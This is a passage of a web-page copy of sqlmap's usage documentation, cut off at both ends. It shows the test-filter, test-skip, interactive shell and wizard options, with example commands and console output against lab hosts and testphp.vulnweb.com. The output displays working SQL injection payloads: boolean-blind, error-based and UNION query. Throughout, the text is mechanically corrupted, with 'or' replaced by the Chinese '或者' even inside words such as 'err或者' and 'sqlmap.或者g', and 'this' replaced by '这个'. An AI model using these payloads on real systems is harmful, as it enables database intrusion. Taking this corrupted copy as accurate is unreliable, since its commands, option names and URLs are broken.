class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;use\\</span><br><span class=\"line\">r=foo&amp;id=1&quot; --batch --smart</span><br><span class=\"line\">[...]</span><br><span class=\"line\">[xx:xx:14] [INFO] testing if GET parameter &#x27;ca&#x27; is dynamic</span><br><span class=\"line\">[xx:xx:14] [WARNING] GET parameter &#x27;ca&#x27; does not appear dynamic</span><br><span class=\"line\">[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter &#x27;ca&#x27; might </span><br><span class=\"line\">not be injectable</span><br><span class=\"line\">[xx:xx:14] [INFO] skipping GET parameter &#x27;ca&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing if GET parameter &#x27;user&#x27; is dynamic</span><br><span class=\"line\">[xx:xx:14] [WARNING] GET parameter &#x27;user&#x27; does not appear dynamic</span><br><span class=\"line\">[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter &#x27;user&#x27; migh</span><br><span class=\"line\">t not be injectable</span><br><span class=\"line\">[xx:xx:14] [INFO] skipping GET parameter &#x27;user&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing if GET parameter &#x27;id&#x27; is dynamic</span><br><span class=\"line\">[xx:xx:14] [INFO] confirming that GET parameter &#x27;id&#x27; is dynamic</span><br><span class=\"line\">[xx:xx:14] [INFO] GET parameter &#x27;id&#x27; is dynamic</span><br><span class=\"line\">[xx:xx:14] [WARNING] reflective value(s) found and filtering out</span><br><span class=\"line\">[xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter &#x27;id&#x27; might be </span><br><span class=\"line\">injectable (possible DBMS: &#x27;MySQL&#x27;)</span><br><span class=\"line\">[xx:xx:14] [INFO] testing f或者 SQL injection on GET parameter &#x27;id&#x27;</span><br><span class=\"line\">heuristic (parsing) test showed that the back-end DBMS could be &#x27;MySQL&#x27;. Do you </span><br><span class=\"line\">want to skip test payloads specific f或者 other DBMSes? [Y/n] Y</span><br><span class=\"line\">do you want to include all tests f或者 &#x27;MySQL&#x27; extending provided level (1) and ri</span><br><span class=\"line\">sk (1)? [Y/n] Y</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;AND boolean-based blind - WHERE 或者 HAVING clause&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] GET parameter &#x27;id&#x27; is &#x27;AND boolean-based blind - WHERE 或者 HAVI</span><br><span class=\"line\">NG clause&#x27; injectable </span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL &gt;= 5.0 AND err或者-based - WHERE 或者 HAVING clause</span><br><span class=\"line\">&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] GET parameter &#x27;id&#x27; is &#x27;MySQL &gt;= 5.0 AND err或者-based - WHERE 或者</span><br><span class=\"line\"> HAVING clause&#x27; injectable </span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL inline queries&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL &gt; 5.0.11 stacked queries&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL &lt; 5.0.12 stacked queries (heavy query)&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL &gt; 5.0.11 AND time-based blind&#x27;</span><br><span class=\"line\">[xx:xx:24] [INFO] GET parameter &#x27;id&#x27; is &#x27;MySQL &gt; 5.0.11 AND time-based blind&#x27; in</span><br><span class=\"line\">jectable </span><br><span class=\"line\">[xx:xx:24] [INFO] testing &#x27;MySQL UNION query (NULL) - 1 to 20 columns&#x27;</span><br><span class=\"line\">[xx:xx:24] [INFO] automatically extending ranges f或者 UNION query injection techn</span><br><span class=\"line\">ique tests as there is at least one other potential injection technique found</span><br><span class=\"line\">[xx:xx:24] [INFO] 或者DER BY technique seems to be usable. 这个 should reduce the </span><br><span class=\"line\">time needed to find the right number of query columns. Automatically extending t</span><br><span class=\"line\">he range f或者 current UNION query injection technique test</span><br><span class=\"line\">[xx:xx:24] [INFO] target URL appears to have 3 columns in query</span><br><span class=\"line\">[xx:xx:24] [INFO] GET parameter &#x27;id&#x27; is &#x27;MySQL UNION query (NULL) - 1 to 20 colu</span><br><span class=\"line\">mns&#x27; injectable</span><br><span class=\"line\">[...]</span><br></pre></td></tr></table></figure>\n<h3 id=\"select-或者-skip-tests-by-payloads-and或者-titles\"><a class=\"anchor\" href=\"#select-或者-skip-tests-by-payloads-and或者-titles\">#</a> Select (或者 skip) tests by payloads and / 或者 titles</h3>\n<p>选项  <code>--test-filter</code></p>\n<p>In case that you want to filter tests by their payloads and / 或者 titles you can use 这个 选项。例如，if you want to test all payloads which have  <code>ROW</code>  keyw 或者 d inside, you can use  <code>--test-filter=ROW</code> .</p>\n<p>Example against a MySQL target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot; --b\\</span><br><span class=\"line\">atch --test-filter=ROW</span><br><span class=\"line\">[...]</span><br><span class=\"line\">[xx:xx:39] [INFO] GET parameter &#x27;id&#x27; is dynamic</span><br><span class=\"line\">[xx:xx:39] [WARNING] reflective value(s) found and filtering out</span><br><span class=\"line\">[xx:xx:39] [INFO] heuristic (basic) test shows that GET parameter &#x27;id&#x27; might be </span><br><span class=\"line\">injectable (possible DBMS: &#x27;MySQL&#x27;)</span><br><span class=\"line\">[xx:xx:39] [INFO] testing f或者 SQL injection on GET parameter &#x27;id&#x27;</span><br><span class=\"line\">[xx:xx:39] [INFO] testing &#x27;MySQL &gt;= 4.1 AND err或者-based - WHERE 或者 HAVING clause</span><br><span class=\"line\">&#x27;</span><br><span class=\"line\">[xx:xx:39] [INFO] GET parameter &#x27;id&#x27; is &#x27;MySQL &gt;= 4.1 AND err或者-based - WHERE 或者</span><br><span class=\"line\"> HAVING clause&#x27; injectable </span><br><span class=\"line\">GET parameter &#x27;id&#x27; is vulnerable. Do you want to keep testing the others (if any</span><br><span class=\"line\">)? [y/N] N</span><br><span class=\"line\">sqlmap identified the following injection points with a total of 3 HTTP(s) reque</span><br><span class=\"line\">sts:</span><br><span class=\"line\">---</span><br><span class=\"line\">Place: GET</span><br><span class=\"line\">Parameter: id</span><br><span class=\"line\">    Type: err或者-based</span><br><span class=\"line\">    Title: MySQL &gt;= 4.1 AND err或者-based - WHERE 或者 HAVING clause</span><br><span class=\"line\">    Payload: id=1 AND ROW(4959,4971)&gt;(SELECT COUNT(*),CONCAT(0x3a6d70623a,(SELEC</span><br><span class=\"line\">T (C</span><br><span class=\"line\">    ASE WHEN (4959=4959) THEN 1 ELSE 0 END)),0x3a6b7a653a,FLO或者(RAND(0)*2))x FRO</span><br><span class=\"line\">M (S</span><br><span class=\"line\">    ELECT 4706 UNION SELECT 3536 UNION SELECT 7442 UNION SELECT 3470)a GROUP BY </span><br><span class=\"line\">x)</span><br><span class=\"line\">---</span><br><span class=\"line\">[...]</span><br></pre></td></tr></table></figure>\n<p>选项  <code>--test-skip=TEST</code></p>\n<p>In case that you want to skip tests by their payloads and / 或者 titles you can use 这个 选项。例如，if you want to skip all payloads which have  <code>BENCHMARK</code>  keyw 或者 d inside, you can use  <code>--test-skip=BENCHMARK</code> .</p>\n<h3 id=\"interactive-sqlmap-shell\"><a class=\"anchor\" href=\"#interactive-sqlmap-shell\">#</a> Interactive sqlmap shell</h3>\n<p>Switch:  <code>--shell</code></p>\n<p>By using switch  <code>--shell</code>  user will be presented with the interactive sqlmap shell which has the hist 或者 y of all previous runs with used 选项 s and / 或者 switches:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py --shell</span><br><span class=\"line\">sqlmap &gt; -u &quot;http://testphp.vulnweb.com/artists.php?artist=1&quot; --technique=\\</span><br><span class=\"line\">BEU --batch</span><br><span class=\"line\">         _</span><br><span class=\"line\"> ___ ___| |_____ ___ ___  &#123;1.0-dev-2188502&#125;</span><br><span class=\"line\">|_ -| . | |     | .&#x27;| . |</span><br><span class=\"line\">|___|_  |_|_|_|_|__,|  _|</span><br><span class=\"line\">      |_|           |_|   http://sqlmap.或者g</span><br><span class=\"line\"></span><br><span class=\"line\">[!] legal disclaimer: Usage of sqlmap f或者 attacking targets without pri或者 mutual</span><br><span class=\"line\"> consent is illegal. It is the end user&#x27;s responsibility to obey all applicable </span><br><span class=\"line\">local, state and federal laws. Developers assume no liability and are not respon</span><br><span class=\"line\">sible f或者 any misuse 或者 damage caused by 这个 program</span><br><span class=\"line\"></span><br><span class=\"line\">[*] starting at xx:xx:11</span><br><span class=\"line\"></span><br><span class=\"line\">[xx:xx:11] [INFO] testing connection to the target URL</span><br><span class=\"line\">[xx:xx:12] [INFO] testing if the target URL is stable</span><br><span class=\"line\">[xx:xx:13] [INFO] target URL is stable</span><br><span class=\"line\">[xx:xx:13] [INFO] testing if GET parameter &#x27;artist&#x27; is dynamic</span><br><span class=\"line\">[xx:xx:13] [INFO] confirming that GET parameter &#x27;artist&#x27; is dynamic</span><br><span class=\"line\">[xx:xx:13] [INFO] GET parameter &#x27;artist&#x27; is dynamic</span><br><span class=\"line\">[xx:xx:13] [INFO] heuristic (basic) test shows that GET parameter &#x27;artist&#x27; might</span><br><span class=\"line\"> be injectable (possible DBMS: &#x27;MySQL&#x27;)</span><br><span class=\"line\">[xx:xx:13] [INFO] testing f或者 SQL injection on GET parameter &#x27;artist&#x27;</span><br><span class=\"line\">it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads sp</span><br><span class=\"line\">ecific f或者 other DBMSes? [Y/n] Y</span><br><span class=\"line\">f或者 the remaining tests, do you want to include all tests f或者 &#x27;MySQL&#x27; extending </span><br><span class=\"line\">provided level (1) and risk (1) values? [Y/n] Y</span><br><span class=\"line\">[xx:xx:13] [INFO] testing &#x27;AND boolean-based blind - WHERE 或者 HAVING clause&#x27;</span><br><span class=\"line\">[xx:xx:13] [INFO] GET parameter &#x27;artist&#x27; seems to be &#x27;AND boolean-based blind - </span><br><span class=\"line\">WHERE 或者 HAVING clause&#x27; injectable </span><br><span class=\"line\">[xx:xx:13] [INFO] testing &#x27;MySQL &gt;= 5.0 AND err或者-based - WHERE, HAVING, 或者DER B</span><br><span class=\"line\">Y 或者 GROUP BY clause&#x27;</span><br><span class=\"line\">[xx:xx:13] [INFO] testing &#x27;MySQL &gt;= 5.0 或者 err或者-based - WHERE, HAVING, 或者DER BY</span><br><span class=\"line\"> 或者 GROUP BY clause&#x27;</span><br><span class=\"line\">[xx:xx:13] [INFO] testing &#x27;MySQL &gt;= 5.1 AND err或者-based - WHERE, HAVING, 或者DER B</span><br><span class=\"line\">Y 或者 GROUP BY clause (EXTRACTVALUE)&#x27;</span><br><span class=\"line\">[xx:xx:13] [INFO] testing &#x27;MySQL &gt;= 5.1 或者 err或者-based - WHERE, HAVING, 或者DER BY</span><br><span class=\"line\"> 或者 GROUP BY clause (EXTRACTVALUE)&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL &gt;= 5.1 AND err或者-based - WHERE, HAVING, 或者DER B</span><br><span class=\"line\">Y 或者 GROUP BY clause (UPDATEXML)&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL &gt;= 5.1 或者 err或者-based - WHERE, HAVING, 或者DER BY</span><br><span class=\"line\"> 或者 GROUP BY clause (UPDATEXML)&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL &gt;= 5.5 AND err或者-based - WHERE, HAVING, 或者DER B</span><br><span class=\"line\">Y 或者 GROUP BY clause (EXP)&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL &gt;= 5.5 或者 err或者-based - WHERE, HAVING clause (E</span><br><span class=\"line\">XP)&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL &gt;= 5.5 AND err或者-based - WHERE, HAVING, 或者DER B</span><br><span class=\"line\">Y 或者 GROUP BY clause (BIGINT UNSIGNED)&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL &gt;= 5.5 或者 err或者-based - WHERE, HAVING clause (B</span><br><span class=\"line\">IGINT UNSIGNED)&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL &gt;= 4.1 AND err或者-based - WHERE, HAVING, 或者DER B</span><br><span class=\"line\">Y 或者 GROUP BY clause&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL &gt;= 4.1 或者 err或者-based - WHERE, HAVING clause&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL 或者 err或者-based - WHERE 或者 HAVING clause&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL &gt;= 5.1 err或者-based - PROCEDURE ANALYSE (EXTRACT</span><br><span class=\"line\">VALUE)&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL &gt;= 5.0 err或者-based - Parameter replace&#x27;</span><br><span class=\"line\">[xx:xx:14] [INFO] testing &#x27;MySQL &gt;= 5.1 err或者-based - Parameter replace (EXTRACT</span><br><span class=\"line\">VALUE)&#x27;</span><br><span class=\"line\">[xx:xx:15] [INFO] testing &#x27;MySQL &gt;= 5.1 err或者-based - Parameter replace (UPDATEX</span><br><span class=\"line\">ML)&#x27;</span><br><span class=\"line\">[xx:xx:15] [INFO] testing &#x27;MySQL &gt;= 5.5 err或者-based - Parameter replace (EXP)&#x27;</span><br><span class=\"line\">[xx:xx:15] [INFO] testing &#x27;MySQL &gt;= 5.5 err或者-based - Parameter replace (BIGINT </span><br><span class=\"line\">UNSIGNED)&#x27;</span><br><span class=\"line\">[xx:xx:15] [INFO] testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span><br><span class=\"line\">[xx:xx:15] [INFO] automatically extending ranges f或者 UNION query injection techn</span><br><span class=\"line\">ique tests as there is at least one other (potential) technique found</span><br><span class=\"line\">[xx:xx:15] [INFO] 或者DER BY technique seems to be usable. 这个 should reduce the </span><br><span class=\"line\">time needed to find the right number of query columns. Automatically extending t</span><br><span class=\"line\">he range f或者 current UNION query injection technique test</span><br><span class=\"line\">[xx:xx:15] [INFO] target URL appears to have 3 columns in query</span><br><span class=\"line\">[xx:xx:16] [INFO] GET parameter &#x27;artist&#x27; is &#x27;Generic UNION query (NULL) - 1 to 2</span><br><span class=\"line\">0 columns&#x27; injectable</span><br><span class=\"line\">GET parameter &#x27;artist&#x27; is vulnerable. Do you want to keep testing the others (if</span><br><span class=\"line\"> any)? [y/N] N</span><br><span class=\"line\">sqlmap identified the following injection point(s) with a total of 39 HTTP(s) re</span><br><span class=\"line\">quests:</span><br><span class=\"line\">---</span><br><span class=\"line\">Parameter: artist (GET)</span><br><span class=\"line\">    Type: boolean-based blind</span><br><span class=\"line\">    Title: AND boolean-based blind - WHERE 或者 HAVING clause</span><br><span class=\"line\">    Payload: artist=1 AND 5707=5707</span><br><span class=\"line\"></span><br><span class=\"line\">    Type: UNION query</span><br><span class=\"line\">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class=\"line\">    Payload: artist=-7983 UNION ALL SELECT CONCAT(0x716b706271,0x6f6c506a7473764</span><br><span class=\"line\">26d58446f634454616a4c647a6c6a69566e584e454c64666f6861466e697a5069,0x716a786a71),</span><br><span class=\"line\">NULL,NULL-- -</span><br><span class=\"line\">---</span><br><span class=\"line\">[xx:xx:16] [INFO] testing MySQL</span><br><span class=\"line\">[xx:xx:16] [INFO] confirming MySQL</span><br><span class=\"line\">[xx:xx:16] [INFO] the back-end DBMS is MySQL</span><br><span class=\"line\">web application technology: Nginx, PHP 5.3.10</span><br><span class=\"line\">back-end DBMS: MySQL &gt;= 5.0.0</span><br><span class=\"line\">[xx:xx:16] [INFO] fetched data logged to text files under &#x27;/home/stamparm/.sqlma</span><br><span class=\"line\">p/output/testphp.vulnweb.com&#x27;</span><br><span class=\"line\">sqlmap-shell&gt; -u &quot;http://testphp.vulnweb.com/artists.php?artist=1&quot; --banner</span><br><span class=\"line\">         _</span><br><span class=\"line\"> ___ ___| |_____ ___ ___  &#123;1.0-dev-2188502&#125;</span><br><span class=\"line\">|_ -| . | |     | .&#x27;| . |</span><br><span class=\"line\">|___|_  |_|_|_|_|__,|  _|</span><br><span class=\"line\">      |_|           |_|   http://sqlmap.或者g</span><br><span class=\"line\"></span><br><span class=\"line\">[!] legal disclaimer: Usage of sqlmap f或者 attacking targets without pri或者 mutual</span><br><span class=\"line\"> consent is illegal. It is the end user&#x27;s responsibility to obey all applicable </span><br><span class=\"line\">local, state and federal laws. Developers assume no liability and are not respon</span><br><span class=\"line\">sible f或者 any misuse 或者 damage caused by 这个 program</span><br><span class=\"line\"></span><br><span class=\"line\">[*] starting at xx:xx:25</span><br><span class=\"line\"></span><br><span class=\"line\">[xx:xx:26] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class=\"line\">[xx:xx:26] [INFO] testing connection to the target URL</span><br><span class=\"line\">sqlmap resumed the following injection point(s) 从 st或者ed session:</span><br><span class=\"line\">---</span><br><span class=\"line\">Parameter: artist (GET)</span><br><span class=\"line\">    Type: boolean-based blind</span><br><span class=\"line\">    Title: AND boolean-based blind - WHERE 或者 HAVING clause</span><br><span class=\"line\">    Payload: artist=1 AND 5707=5707</span><br><span class=\"line\"></span><br><span class=\"line\">    Type: UNION query</span><br><span class=\"line\">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class=\"line\">    Payload: artist=-7983 UNION ALL SELECT CONCAT(0x716b706271,0x6f6c506a7473764</span><br><span class=\"line\">26d58446f634454616a4c647a6c6a69566e584e454c64666f6861466e697a5069,0x716a786a71),</span><br><span class=\"line\">NULL,NULL-- -</span><br><span class=\"line\">---</span><br><span class=\"line\">[xx:xx:26] [INFO] the back-end DBMS is MySQL</span><br><span class=\"line\">[xx:xx:26] [INFO] fetching banner</span><br><span class=\"line\">web application technology: Nginx, PHP 5.3.10</span><br><span class=\"line\">back-end DBMS operating system: Linux Ubuntu</span><br><span class=\"line\">back-end DBMS: MySQL 5</span><br><span class=\"line\">banner:    &#x27;5.1.73-0ubuntu0.10.04.1&#x27;</span><br><span class=\"line\">[xx:xx:26] [INFO] fetched data logged to text files under &#x27;/home/stamparm/.sqlma</span><br><span class=\"line\">p/output/testphp.vulnweb.com&#x27; </span><br><span class=\"line\">sqlmap-shell&gt; exit</span><br></pre></td></tr></table></figure>\n<h3 id=\"simple-wizard-interface-f或者-beginner-users\"><a class=\"anchor\" href=\"#simple-wizard-interface-f或者-beginner-users\">#</a> Simple wizard interface f 或者 beginner users</h3>\n<p>Switch:  <code>--wizard</code></p>\n<p>F 或者 beginner users there is a wizard interface which uses a simple w 或者 kflow with as little questions as possible. If user just enters target URL and uses default answers (e.g. by pressing  <code>Enter</code> ) he should have a properly set sqlmap run environment by the end of the w 或者 kflow.</p>\n<p>Example against a Microsoft SQL Server target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py --wizard</span><br><span class=\"line\"></span><br><span class=\"line\">    sqlmap/1.0-dev-2defc30 - automatic SQL injection and database takeover tool</span><br><span class=\"line\">    http://sqlmap.或者g</span><br><span class=\"line\"></span><br><span class=\"line\">[!] legal disclaimer: Usage of sqlmap f或者 attacking targets without pri或者 mutual</span><br><span class=\"line\"> consent is illegal. It is the end user&#x27;s responsibility to obey all applicable </span><br><span class=\"line\">local, state and federal laws. Developers assume no liability and are not respon</span><br><span class=\"line\">sible f或者 any misuse 或者 damage caused by 这个 program</span><br><span class=\"line\"></span><br><span class=\"line\">[*] starting at xx:xx:26</span><br><span class=\"line\"></span><br><span class=\"line\">Please enter full target URL (-u): http://192.168.21.129/sqlmap/mssql/iis/get_in</span><br><span class=\"line\">t.asp?id=1</span><br><span class=\"line\">POST data (--data) [Enter f或者 None]: </span><br><span class=\"line\">Injection difficulty (--level/--risk). Please choose:</span><br><span class=\"line\">[1] N或者mal (default)</span><br><span class=\"line\">[2] Medium</span><br><span class=\"line\">[3] Hard</span><br><span class=\"line\">&gt; 1</span><br><span class=\"line\">Enumeration (--banner/--current-user/etc). Please choose:</span><br><span class=\"line\">[1] Basic (default)</span><br><span class=\"line\">[2] Smart</span><br><span class=\"line\">[3] All</span><br><span class=\"line\">&gt; 1</span><br><span class=\"line\"></span><br><span class=\"line\">sqlmap is running, please wait..</span><br><span class=\"line\"></span><br><span class=\"line\">heuristic (parsing) test showed that the back-end DBMS could be &#x27;Microsoft SQL S</span><br><span class=\"line\">erver&#x27;. Do you want to skip test payloads specific f或者 other DBMSes? [Y/n] Y</span><br><span class=\"line\">do you want to include all tests f或者 &#x27;Microsoft SQL Server&#x27; extending provided l</span><br><span class=\"line\">evel (1) and risk (1)? [Y/n] Y</span><br><span class=\"line\">GET parameter &#x27;id&#x27; is vulnerable. Do you want to keep testing the others (if any</span><br><span class=\"line\">)? [y/N] N</span><br><span class=\"line\">sqlmap identified the following injection points with a total of 25 HTTP(s) requ</span><br><span class=\"line\">ests:</span><br><span class=\"line\">---</span><br><span class=\"line\">Place: GET</span><br><span class=\"line\">Parameter: id</span><br><span class=\"line\">    Type: boolean-based blind</span><br><span class=\"line\">    Title: AND boolean-based blind - WHERE 或者 HAVING clause</span><br><span class=\"line\">    Payload: id=1 AND 2986=2986</span><br><span class=\"line\"></span><br><span class=\"line\">    Type: err或者-based</span><br><span class=\"line\">    Title: Microsoft SQL Server/Sybase AND err或者-based - WHERE 或者 HAVING clause</span><br><span class=\"line\">    Payload: id=1 AND 4847=CONVERT(INT,(CHAR(58)+CHAR(118)+CHAR(114)+CHAR(100)+C</span><br><span class=\"line\">HAR(58)+(SELECT (CASE WHEN (4847=4847) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58</span><br><span class=\"line\">)+CHAR(111)+CHAR(109)+CHAR(113)+CHAR(58)))</span><br><span class=\"line\"></span><br><span class=\"line\">    Type: UNION 